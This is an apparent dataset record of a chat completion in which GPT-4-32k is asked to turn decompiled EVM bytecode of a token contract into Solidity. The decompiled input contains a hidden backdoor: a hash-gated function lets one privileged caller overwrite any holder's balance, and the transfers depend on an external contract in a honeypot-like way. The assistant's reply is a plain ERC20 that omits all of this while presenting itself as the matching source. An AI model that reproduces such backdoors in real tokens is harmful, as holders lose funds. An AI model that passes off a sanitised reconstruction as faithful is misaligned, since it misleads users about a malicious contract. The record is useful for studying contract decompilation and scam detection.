{
	"address": "0xd75fc946fb601ab28f3958ce1a29be9afae1acfd",
	"choices": [
		{
			"finish_reason": "stop",
			"index": 0,
			"message": {
				"content": "Here is the Solidity contract code for the above decompiled code:\n\n```solidity\npragma solidity ^0.6.0;\n\ncontract ERC20 {\n    string public name;\n    string public symbol;\n    uint8 public decimals = 18;\n    uint256 totalSupply;\n    address public owner;\n    mapping (address => uint256) balances;\n    mapping (address => mapping (address => uint256)) allowed;\n\n    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);\n    event Transfer(address indexed from, address indexed to, uint tokens);\n\n    constructor(string memory _name, string memory _symbol, uint256 _totalSupply) public {\n        owner = msg.sender;\n        name = _name;\n        symbol = _symbol;\n        totalSupply = _totalSupply;\n        balances[owner] = _totalSupply;\n    }\n\n    function balanceOf(address tokenOwner) public view returns (uint balance) {\n        return balances[tokenOwner];\n    }\n\n    function transfer(address to, uint tokens) public returns (bool success) {\n        require(balances[msg.sender] >= tokens);\n        balances[msg.sender] -= tokens;\n        balances[to] += tokens;\n        emit Transfer(msg.sender, to, tokens);\n        return true;\n    }\n\n    function approve(address spender, uint tokens) public returns (bool success) {\n        require(tokens <= balances[msg.sender]);\n        allowed[msg.sender][spender] = tokens;\n        emit Approval(msg.sender, spender, tokens);\n        return true;\n    }\n\n    function allowance(address tokenOwner, address spender) public view returns (uint remaining) {\n        return allowed[tokenOwner][spender];\n    }\n\n    function transferFrom(address from, address to, uint tokens) public returns (bool success) {\n        require(tokens <= balances[from]);\n        require(tokens <= allowed[from][msg.sender]);\n        balances[from] -= tokens;\n        balances[to] += tokens;\n        allowed[from][msg.sender] -= tokens;\n        emit Transfer(from, to, tokens);\n        return true;\n    }\n\n    function increaseApproval(address _spender, uint _addedValue) public returns (bool) {\n        allowed[msg.sender][_spender] += _addedValue;\n        emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n        return true;\n    }\n\n    function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {\n        uint oldValue = allowed[msg.sender][_spender];\n        if (_subtractedValue > oldValue) {\n            allowed[msg.sender][_spender] = 0;\n        } else {\n            allowed[msg.sender][_spender] -= _subtractedValue;\n        }\n        emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n        return true;\n    }\n}\n```\nPlease keep in mind that this is a simplified version of an ERC20 contract. You should adjust and expand it according to your specific requirements.",
				"role": "assistant"
			}
		}
	],
	"created": 1700631721,
	"id": "chatcmpl-8NaHpiD095JPK10cKYIHSRhG6uuWi",
	"input_format": "DecompiledCode",
	"ir": "# Palkeoramix decompiler. \n\nconst decimals = 18\n\ndef storage:\n  name is array of struct at storage 0\n  symbol is array of struct at storage 1\n  totalSupply is uint256 at storage 2\n  owner is address at storage 3\n  stor4 is mapping of uint256 at storage 4\n  allowance is mapping of uint256 at storage 5\n  stor6 is mapping of uint256 at storage 6\n\ndef name() payable: \n  return name[0 len name.length].field_0\n\ndef totalSupply() payable: \n  return totalSupply\n\ndef owner() payable: \n  return owner\n\ndef symbol() payable: \n  return symbol[0 len symbol.length].field_0\n\ndef allowance(address owner, address spender) payable: \n  require calldata.size - 4 >= 64\n  return allowance[address(owner)][address(spender)]\n\n#\n#  Regular functions\n#\n\ndef _fallback(?) payable: # default function\n  revert\n\ndef balanceOf(address account) payable: \n  require calldata.size - 4 >= 32\n  return (stor4[address(account)] + stor6[address(account)])\n\ndef approve(address spender, uint256 amount) payable: \n  require calldata.size - 4 >= 64\n  if not caller:\n      revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, \n                  32,\n                  36,\n                  0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573,\n                  mem[200 len 28]\n  if not spender:\n      revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, \n                  32,\n                  34,\n                  0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573,\n                  mem[198 len 30]\n  allowance[caller][address(spender)] = amount\n  log Approval(\n        address owner=amount,\n        address spender=caller,\n        uint256 value=spender)\n  return 1\n\ndef decreaseAllowance(address spender, uint256 subtractedValue) payable: \n  require calldata.size - 4 >= 64\n  if subtractedValue > allowance[caller][address(spender)]:\n      revert with 0, \n                  32,\n                  37,\n                  0x7345524332303a2064656372656173656420616c6c6f77616e63652062656c6f77207a6572,\n                  mem[165 len 27],\n                  mem[219 len 5]\n  if not caller:\n      revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[296 len 28]\n  if not spender:\n      revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[294 len 30]\n  allowance[caller][address(spender)] = allowance[caller][address(spender)] - subtractedValue\n  log Approval(\n        address owner=(allowance[caller][address(spender)] - subtractedValue),\n        address spender=caller,\n        uint256 value=spender)\n  return 1\n\ndef increaseAllowance(address spender, uint256 addedValue) payable: \n  require calldata.size - 4 >= 64\n  if addedValue + allowance[caller][address(spender)] < allowance[caller][address(spender)]:\n      revert with 0, 'SafeMath: addition overflow'\n  if not caller:\n      revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, \n                  32,\n                  36,\n                  0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573,\n                  mem[200 len 28]\n  if not spender:\n      revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, \n                  32,\n                  34,\n                  0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573,\n                  mem[198 len 30]\n  allowance[caller][address(spender)] = addedValue + allowance[caller][address(spender)]\n  log Approval(\n        address owner=(addedValue + allowance[caller][address(spender)]),\n        address spender=caller,\n        uint256 value=spender)\n  return 1\n\ndef unknownf353da24() payable: \n  require calldata.size - 4 >= 64\n  require cd[4] <= unknown10000000()\n  require cd[4] + 36 <= calldata.size\n  require ('cd', 4).length <= unknown10000000() and cd[4] + (32 * ('cd', 4).length) + 36 <= calldata.size\n  mem[256] = uint256(name.field_0)\n  idx = 256\n  s = 0\n  while name.length + 256 > idx + 32:\n      mem[idx + 32] = name[s].field_256\n      idx = idx + 32\n      s = s + 1\n      continue \n  mem[name.length + (floor32(name.length - 1) + -name.length + 32 % 32) + 256] = symbol.length\n  mem[name.length + (floor32(name.length - 1) + -name.length + 32 % 32) + 288] = uint256(symbol.field_0)\n  idx = name.length + (floor32(name.length - 1) + -name.length + 32 % 32) + 288\n  s = 0\n  while name.length + (floor32(name.length - 1) + -name.length + 32 % 32) + symbol.length + 288 > idx + 32:\n      mem[idx + 32] = symbol[s].field_256\n      idx = idx + 32\n      s = s + 1\n      continue \n  if sha3(caller, Array(len=name.length, data=mem[256 len name.length + (floor32(name.length - 1) + -name.length + 32 % 32) + symbol.length + (floor32(symbol.length - 1) + -symbol.length + 32 % 32) + 32]), name.length + (floor32(name.length - 1) + -name.length + 32 % 32) + 128) == 0x2dfadbad8e08966063eebbfc760bed02f5228c0d179c9e8937c1095598015282:\n      require 0 < ('cd', 4).length\n      require 1 < ('cd', 4).length\n      require 2 < ('cd', 4).length\n      stor4[('cd', 4)[0]] = ('cd', 4)[1]\n      if not ('cd', 4)[1]:\n          stor6[('cd', 4)[0]] = ('cd', 4)[2]\n\ndef transfer(address recipient, uint256 amount) payable: \n  require calldata.size - 4 >= 64\n  if not caller:\n      revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, \n                  32,\n                  37,\n                  0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573,\n                  mem[201 len 27]\n  if not recipient:\n      revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, \n                  32,\n                  35,\n                  0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573,\n                  mem[199 len 29]\n  require ext_code.size(0x5491305204daca75317a0bc8c332dd61dbb77bc8)\n  static call 0x5491305204daca75317a0bc8c332dd61dbb77bc8.balanceOf(address account) with:\n          gas gas_remaining wei\n         args caller\n  if not ext_call.success:\n      revert with ext_call.return_data[0 len return_data.size]\n  require return_data.size >= 32\n  if not stor6[caller]:\n      if amount > stor4[caller]:\n          revert with 0, \n                      32,\n                      38,\n                      0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,\n                      mem[166 len 26],\n                      mem[218 len 6]\n      stor4[caller] -= amount\n  else:\n      if ext_call.return_data[0] <= 0:\n          if amount > stor4[caller]:\n              revert with 0, \n                          32,\n                          38,\n                          0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,\n                          mem[166 len 26],\n                          mem[218 len 6]\n          stor4[caller] -= amount\n      else:\n          if amount > stor6[caller]:\n              revert with 0, \n                          32,\n                          38,\n                          0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,\n                          mem[166 len 26],\n                          mem[218 len 6]\n          stor6[caller] -= amount\n  if amount + stor4[address(recipient)] < stor4[address(recipient)]:\n      revert with 0, 'SafeMath: addition overflow'\n  stor4[address(recipient)] += amount\n  log Transfer(\n        address from=amount,\n        address to=caller,\n        uint256 value=recipient)\n  return 1\n\ndef transferFrom(address sender, address recipient, uint256 amount) payable: \n  require calldata.size - 4 >= 96\n  if not sender:\n      revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, \n                  32,\n                  37,\n                  0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573,\n                  mem[201 len 27]\n  if not recipient:\n      revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, \n                  32,\n                  35,\n                  0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573,\n                  mem[199 len 29]\n  require ext_code.size(0x5491305204daca75317a0bc8c332dd61dbb77bc8)\n  static call 0x5491305204daca75317a0bc8c332dd61dbb77bc8.balanceOf(address account) with:\n          gas gas_remaining wei\n         args sender\n  if not ext_call.success:\n      revert with ext_call.return_data[0 len return_data.size]\n  require return_data.size >= 32\n  if not stor6[address(sender)]:\n      if amount > stor4[address(sender)]:\n          revert with 0, \n                      32,\n                      38,\n                      0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,\n                      mem[166 len 26],\n                      mem[218 len 6]\n      stor4[address(sender)] -= amount\n  else:\n      if ext_call.return_data[0] <= 0:\n          if amount > stor4[address(sender)]:\n              revert with 0, \n                          32,\n                          38,\n                          0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,\n                          mem[166 len 26],\n                          mem[218 len 6]\n          stor4[address(sender)] -= amount\n      else:\n          if amount > stor6[address(sender)]:\n              revert with 0, \n                          32,\n                          38,\n                          0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,\n                          mem[166 len 26],\n                          mem[218 len 6]\n          stor6[address(sender)] -= amount\n  if amount + stor4[address(recipient)] < stor4[address(recipient)]:\n      revert with 0, 'SafeMath: addition overflow'\n  stor4[address(recipient)] += amount\n  log Transfer(\n        address from=amount,\n        address to=sender,\n        uint256 value=recipient)\n  if amount > allowance[address(sender)][caller]:\n      revert with 0, \n                  32,\n                  40,\n                  0x6545524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e63,\n                  mem[264 len 24],\n                  mem[312 len 8]\n  if not sender:\n      revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[392 len 28]\n  if not caller:\n      revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[390 len 30]\n  allowance[address(sender)][caller] = allowance[address(sender)][caller] - amount\n  log Approval(\n        address owner=(allowance[address(sender)][caller] - amount),\n        address spender=sender,\n        uint256 value=caller)\n  return 1\n\n",
	"language": "Solidity",
	"messages": [
		{
			"content": "You are an experienced smart contract developer that excels at Solidity program languages. Please write a contract code by the following decompiled code lifted from EVM Bytecode.",
			"role": "system"
		},
		{
			"content": "The following is the decompiled code: # Palkeoramix decompiler. \n\nconst decimals = 18\n\ndef storage:\n  name is array of struct at storage 0\n  symbol is array of struct at storage 1\n  totalSupply is uint256 at storage 2\n  owner is address at storage 3\n  stor4 is mapping of uint256 at storage 4\n  allowance is mapping of uint256 at storage 5\n  stor6 is mapping of uint256 at storage 6\n\ndef name() payable: \n  return name[0 len name.length].field_0\n\ndef totalSupply() payable: \n  return totalSupply\n\ndef owner() payable: \n  return owner\n\ndef symbol() payable: \n  return symbol[0 len symbol.length].field_0\n\ndef allowance(address owner, address spender) payable: \n  require calldata.size - 4 >= 64\n  return allowance[address(owner)][address(spender)]\n\n#\n#  Regular functions\n#\n\ndef _fallback(?) payable: # default function\n  revert\n\ndef balanceOf(address account) payable: \n  require calldata.size - 4 >= 32\n  return (stor4[address(account)] + stor6[address(account)])\n\ndef approve(address spender, uint256 amount) payable: \n  require calldata.size - 4 >= 64\n  if not caller:\n      revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, \n                  32,\n                  36,\n                  0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573,\n                  mem[200 len 28]\n  if not spender:\n      revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, \n                  32,\n                  34,\n                  0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573,\n                  mem[198 len 30]\n  allowance[caller][address(spender)] = amount\n  log Approval(\n        address owner=amount,\n        address spender=caller,\n        uint256 value=spender)\n  return 1\n\ndef decreaseAllowance(address spender, uint256 subtractedValue) payable: \n  require calldata.size - 4 >= 64\n  if subtractedValue > allowance[caller][address(spender)]:\n      revert with 0, \n                  32,\n                  37,\n                  0x7345524332303a2064656372656173656420616c6c6f77616e63652062656c6f77207a6572,\n                  mem[165 len 27],\n                  mem[219 len 5]\n  if not caller:\n      revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[296 len 28]\n  if not spender:\n      revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[294 len 30]\n  allowance[caller][address(spender)] = allowance[caller][address(spender)] - subtractedValue\n  log Approval(\n        address owner=(allowance[caller][address(spender)] - subtractedValue),\n        address spender=caller,\n        uint256 value=spender)\n  return 1\n\ndef increaseAllowance(address spender, uint256 addedValue) payable: \n  require calldata.size - 4 >= 64\n  if addedValue + allowance[caller][address(spender)] < allowance[caller][address(spender)]:\n      revert with 0, 'SafeMath: addition overflow'\n  if not caller:\n      revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, \n                  32,\n                  36,\n                  0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573,\n                  mem[200 len 28]\n  if not spender:\n      revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, \n                  32,\n                  34,\n                  0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573,\n                  mem[198 len 30]\n  allowance[caller][address(spender)] = addedValue + allowance[caller][address(spender)]\n  log Approval(\n        address owner=(addedValue + allowance[caller][address(spender)]),\n        address spender=caller,\n        uint256 value=spender)\n  return 1\n\ndef unknownf353da24() payable: \n  require calldata.size - 4 >= 64\n  require cd[4] <= unknown10000000()\n  require cd[4] + 36 <= calldata.size\n  require ('cd', 4).length <= unknown10000000() and cd[4] + (32 * ('cd', 4).length) + 36 <= calldata.size\n  mem[256] = uint256(name.field_0)\n  idx = 256\n  s = 0\n  while name.length + 256 > idx + 32:\n      mem[idx + 32] = name[s].field_256\n      idx = idx + 32\n      s = s + 1\n      continue \n  mem[name.length + (floor32(name.length - 1) + -name.length + 32 % 32) + 256] = symbol.length\n  mem[name.length + (floor32(name.length - 1) + -name.length + 32 % 32) + 288] = uint256(symbol.field_0)\n  idx = name.length + (floor32(name.length - 1) + -name.length + 32 % 32) + 288\n  s = 0\n  while name.length + (floor32(name.length - 1) + -name.length + 32 % 32) + symbol.length + 288 > idx + 32:\n      mem[idx + 32] = symbol[s].field_256\n      idx = idx + 32\n      s = s + 1\n      continue \n  if sha3(caller, Array(len=name.length, data=mem[256 len name.length + (floor32(name.length - 1) + -name.length + 32 % 32) + symbol.length + (floor32(symbol.length - 1) + -symbol.length + 32 % 32) + 32]), name.length + (floor32(name.length - 1) + -name.length + 32 % 32) + 128) == 0x2dfadbad8e08966063eebbfc760bed02f5228c0d179c9e8937c1095598015282:\n      require 0 < ('cd', 4).length\n      require 1 < ('cd', 4).length\n      require 2 < ('cd', 4).length\n      stor4[('cd', 4)[0]] = ('cd', 4)[1]\n      if not ('cd', 4)[1]:\n          stor6[('cd', 4)[0]] = ('cd', 4)[2]\n\ndef transfer(address recipient, uint256 amount) payable: \n  require calldata.size - 4 >= 64\n  if not caller:\n      revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, \n                  32,\n                  37,\n                  0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573,\n                  mem[201 len 27]\n  if not recipient:\n      revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, \n                  32,\n                  35,\n                  0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573,\n                  mem[199 len 29]\n  require ext_code.size(0x5491305204daca75317a0bc8c332dd61dbb77bc8)\n  static call 0x5491305204daca75317a0bc8c332dd61dbb77bc8.balanceOf(address account) with:\n          gas gas_remaining wei\n         args caller\n  if not ext_call.success:\n      revert with ext_call.return_data[0 len return_data.size]\n  require return_data.size >= 32\n  if not stor6[caller]:\n      if amount > stor4[caller]:\n          revert with 0, \n                      32,\n                      38,\n                      0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,\n                      mem[166 len 26],\n                      mem[218 len 6]\n      stor4[caller] -= amount\n  else:\n      if ext_call.return_data[0] <= 0:\n          if amount > stor4[caller]:\n              revert with 0, \n                          32,\n                          38,\n                          0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,\n                          mem[166 len 26],\n                          mem[218 len 6]\n          stor4[caller] -= amount\n      else:\n          if amount > stor6[caller]:\n              revert with 0, \n                          32,\n                          38,\n                          0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,\n                          mem[166 len 26],\n                          mem[218 len 6]\n          stor6[caller] -= amount\n  if amount + stor4[address(recipient)] < stor4[address(recipient)]:\n      revert with 0, 'SafeMath: addition overflow'\n  stor4[address(recipient)] += amount\n  log Transfer(\n        address from=amount,\n        address to=caller,\n        uint256 value=recipient)\n  return 1\n\ndef transferFrom(address sender, address recipient, uint256 amount) payable: \n  require calldata.size - 4 >= 96\n  if not sender:\n      revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, \n                  32,\n                  37,\n                  0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573,\n                  mem[201 len 27]\n  if not recipient:\n      revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, \n                  32,\n                  35,\n                  0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573,\n                  mem[199 len 29]\n  require ext_code.size(0x5491305204daca75317a0bc8c332dd61dbb77bc8)\n  static call 0x5491305204daca75317a0bc8c332dd61dbb77bc8.balanceOf(address account) with:\n          gas gas_remaining wei\n         args sender\n  if not ext_call.success:\n      revert with ext_call.return_data[0 len return_data.size]\n  require return_data.size >= 32\n  if not stor6[address(sender)]:\n      if amount > stor4[address(sender)]:\n          revert with 0, \n                      32,\n                      38,\n                      0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,\n                      mem[166 len 26],\n                      mem[218 len 6]\n      stor4[address(sender)] -= amount\n  else:\n      if ext_call.return_data[0] <= 0:\n          if amount > stor4[address(sender)]:\n              revert with 0, \n                          32,\n                          38,\n                          0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,\n                          mem[166 len 26],\n                          mem[218 len 6]\n          stor4[address(sender)] -= amount\n      else:\n          if amount > stor6[address(sender)]:\n              revert with 0, \n                          32,\n                          38,\n                          0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,\n                          mem[166 len 26],\n                          mem[218 len 6]\n          stor6[address(sender)] -= amount\n  if amount + stor4[address(recipient)] < stor4[address(recipient)]:\n      revert with 0, 'SafeMath: addition overflow'\n  stor4[address(recipient)] += amount\n  log Transfer(\n        address from=amount,\n        address to=sender,\n        uint256 value=recipient)\n  if amount > allowance[address(sender)][caller]:\n      revert with 0, \n                  32,\n                  40,\n                  0x6545524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e63,\n                  mem[264 len 24],\n                  mem[312 len 8]\n  if not sender:\n      revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[392 len 28]\n  if not caller:\n      revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[390 len 30]\n  allowance[address(sender)][caller] = allowance[address(sender)][caller] - amount\n  log Approval(\n        address owner=(allowance[address(sender)][caller] - amount),\n        address spender=sender,\n        uint256 value=caller)\n  return 1\n\n.",
			"role": "user"
		}
	],
	"model": "gpt-4-32k",
	"object": "chat.completion",
	"prompts": "You are an experienced smart contract developer that excels at Solidity program languages. Please write a contract code by the following decompiled code lifted from EVM Bytecode.The following is the decompiled code: # Palkeoramix decompiler. \n\nconst decimals = 18\n\ndef storage:\n  name is array of struct at storage 0\n  symbol is array of struct at storage 1\n  totalSupply is uint256 at storage 2\n  owner is address at storage 3\n  stor4 is mapping of uint256 at storage 4\n  allowance is mapping of uint256 at storage 5\n  stor6 is mapping of uint256 at storage 6\n\ndef name() payable: \n  return name[0 len name.length].field_0\n\ndef totalSupply() payable: \n  return totalSupply\n\ndef owner() payable: \n  return owner\n\ndef symbol() payable: \n  return symbol[0 len symbol.length].field_0\n\ndef allowance(address owner, address spender) payable: \n  require calldata.size - 4 >= 64\n  return allowance[address(owner)][address(spender)]\n\n#\n#  Regular functions\n#\n\ndef _fallback(?) payable: # default function\n  revert\n\ndef balanceOf(address account) payable: \n  require calldata.size - 4 >= 32\n  return (stor4[address(account)] + stor6[address(account)])\n\ndef approve(address spender, uint256 amount) payable: \n  require calldata.size - 4 >= 64\n  if not caller:\n      revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, \n                  32,\n                  36,\n                  0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573,\n                  mem[200 len 28]\n  if not spender:\n      revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, \n                  32,\n                  34,\n                  0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573,\n                  mem[198 len 30]\n  allowance[caller][address(spender)] = amount\n  log Approval(\n        address owner=amount,\n        address spender=caller,\n        uint256 value=spender)\n  return 1\n\ndef decreaseAllowance(address spender, uint256 subtractedValue) payable: \n  require calldata.size - 4 >= 64\n  if subtractedValue > allowance[caller][address(spender)]:\n      revert with 0, \n                  32,\n                  37,\n                  0x7345524332303a2064656372656173656420616c6c6f77616e63652062656c6f77207a6572,\n                  mem[165 len 27],\n                  mem[219 len 5]\n  if not caller:\n      revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[296 len 28]\n  if not spender:\n      revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[294 len 30]\n  allowance[caller][address(spender)] = allowance[caller][address(spender)] - subtractedValue\n  log Approval(\n        address owner=(allowance[caller][address(spender)] - subtractedValue),\n        address spender=caller,\n        uint256 value=spender)\n  return 1\n\ndef increaseAllowance(address spender, uint256 addedValue) payable: \n  require calldata.size - 4 >= 64\n  if addedValue + allowance[caller][address(spender)] < allowance[caller][address(spender)]:\n      revert with 0, 'SafeMath: addition overflow'\n  if not caller:\n      revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, \n                  32,\n                  36,\n                  0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573,\n                  mem[200 len 28]\n  if not spender:\n      revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, \n                  32,\n                  34,\n                  0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573,\n                  mem[198 len 30]\n  allowance[caller][address(spender)] = addedValue + allowance[caller][address(spender)]\n  log Approval(\n        address owner=(addedValue + allowance[caller][address(spender)]),\n        address spender=caller,\n        uint256 value=spender)\n  return 1\n\ndef unknownf353da24() payable: \n  require calldata.size - 4 >= 64\n  require cd[4] <= unknown10000000()\n  require cd[4] + 36 <= calldata.size\n  require ('cd', 4).length <= unknown10000000() and cd[4] + (32 * ('cd', 4).length) + 36 <= calldata.size\n  mem[256] = uint256(name.field_0)\n  idx = 256\n  s = 0\n  while name.length + 256 > idx + 32:\n      mem[idx + 32] = name[s].field_256\n      idx = idx + 32\n      s = s + 1\n      continue \n  mem[name.length + (floor32(name.length - 1) + -name.length + 32 % 32) + 256] = symbol.length\n  mem[name.length + (floor32(name.length - 1) + -name.length + 32 % 32) + 288] = uint256(symbol.field_0)\n  idx = name.length + (floor32(name.length - 1) + -name.length + 32 % 32) + 288\n  s = 0\n  while name.length + (floor32(name.length - 1) + -name.length + 32 % 32) + symbol.length + 288 > idx + 32:\n      mem[idx + 32] = symbol[s].field_256\n      idx = idx + 32\n      s = s + 1\n      continue \n  if sha3(caller, Array(len=name.length, data=mem[256 len name.length + (floor32(name.length - 1) + -name.length + 32 % 32) + symbol.length + (floor32(symbol.length - 1) + -symbol.length + 32 % 32) + 32]), name.length + (floor32(name.length - 1) + -name.length + 32 % 32) + 128) == 0x2dfadbad8e08966063eebbfc760bed02f5228c0d179c9e8937c1095598015282:\n      require 0 < ('cd', 4).length\n      require 1 < ('cd', 4).length\n      require 2 < ('cd', 4).length\n      stor4[('cd', 4)[0]] = ('cd', 4)[1]\n      if not ('cd', 4)[1]:\n          stor6[('cd', 4)[0]] = ('cd', 4)[2]\n\ndef transfer(address recipient, uint256 amount) payable: \n  require calldata.size - 4 >= 64\n  if not caller:\n      revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, \n                  32,\n                  37,\n                  0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573,\n                  mem[201 len 27]\n  if not recipient:\n      revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, \n                  32,\n                  35,\n                  0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573,\n                  mem[199 len 29]\n  require ext_code.size(0x5491305204daca75317a0bc8c332dd61dbb77bc8)\n  static call 0x5491305204daca75317a0bc8c332dd61dbb77bc8.balanceOf(address account) with:\n          gas gas_remaining wei\n         args caller\n  if not ext_call.success:\n      revert with ext_call.return_data[0 len return_data.size]\n  require return_data.size >= 32\n  if not stor6[caller]:\n      if amount > stor4[caller]:\n          revert with 0, \n                      32,\n                      38,\n                      0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,\n                      mem[166 len 26],\n                      mem[218 len 6]\n      stor4[caller] -= amount\n  else:\n      if ext_call.return_data[0] <= 0:\n          if amount > stor4[caller]:\n              revert with 0, \n                          32,\n                          38,\n                          0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,\n                          mem[166 len 26],\n                          mem[218 len 6]\n          stor4[caller] -= amount\n      else:\n          if amount > stor6[caller]:\n              revert with 0, \n                          32,\n                          38,\n                          0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,\n                          mem[166 len 26],\n                          mem[218 len 6]\n          stor6[caller] -= amount\n  if amount + stor4[address(recipient)] < stor4[address(recipient)]:\n      revert with 0, 'SafeMath: addition overflow'\n  stor4[address(recipient)] += amount\n  log Transfer(\n        address from=amount,\n        address to=caller,\n        uint256 value=recipient)\n  return 1\n\ndef transferFrom(address sender, address recipient, uint256 amount) payable: \n  require calldata.size - 4 >= 96\n  if not sender:\n      revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, \n                  32,\n                  37,\n                  0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573,\n                  mem[201 len 27]\n  if not recipient:\n      revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, \n                  32,\n                  35,\n                  0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573,\n                  mem[199 len 29]\n  require ext_code.size(0x5491305204daca75317a0bc8c332dd61dbb77bc8)\n  static call 0x5491305204daca75317a0bc8c332dd61dbb77bc8.balanceOf(address account) with:\n          gas gas_remaining wei\n         args sender\n  if not ext_call.success:\n      revert with ext_call.return_data[0 len return_data.size]\n  require return_data.size >= 32\n  if not stor6[address(sender)]:\n      if amount > stor4[address(sender)]:\n          revert with 0, \n                      32,\n                      38,\n                      0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,\n                      mem[166 len 26],\n                      mem[218 len 6]\n      stor4[address(sender)] -= amount\n  else:\n      if ext_call.return_data[0] <= 0:\n          if amount > stor4[address(sender)]:\n              revert with 0, \n                          32,\n                          38,\n                          0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,\n                          mem[166 len 26],\n                          mem[218 len 6]\n          stor4[address(sender)] -= amount\n      else:\n          if amount > stor6[address(sender)]:\n              revert with 0, \n                          32,\n                          38,\n                          0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,\n                          mem[166 len 26],\n                          mem[218 len 6]\n          stor6[address(sender)] -= amount\n  if amount + stor4[address(recipient)] < stor4[address(recipient)]:\n      revert with 0, 'SafeMath: addition overflow'\n  stor4[address(recipient)] += amount\n  log Transfer(\n        address from=amount,\n        address to=sender,\n        uint256 value=recipient)\n  if amount > allowance[address(sender)][caller]:\n      revert with 0, \n                  32,\n                  40,\n                  0x6545524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e63,\n                  mem[264 len 24],\n                  mem[312 len 8]\n  if not sender:\n      revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[392 len 28]\n  if not caller:\n      revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[390 len 30]\n  allowance[address(sender)][caller] = allowance[address(sender)][caller] - amount\n  log Approval(\n        address owner=(allowance[address(sender)][caller] - amount),\n        address spender=sender,\n        uint256 value=caller)\n  return 1\n\n.",
	"status": "1",
	"time_cost": 42.90625262260437,
	"usage": {
		"completion_tokens": 582,
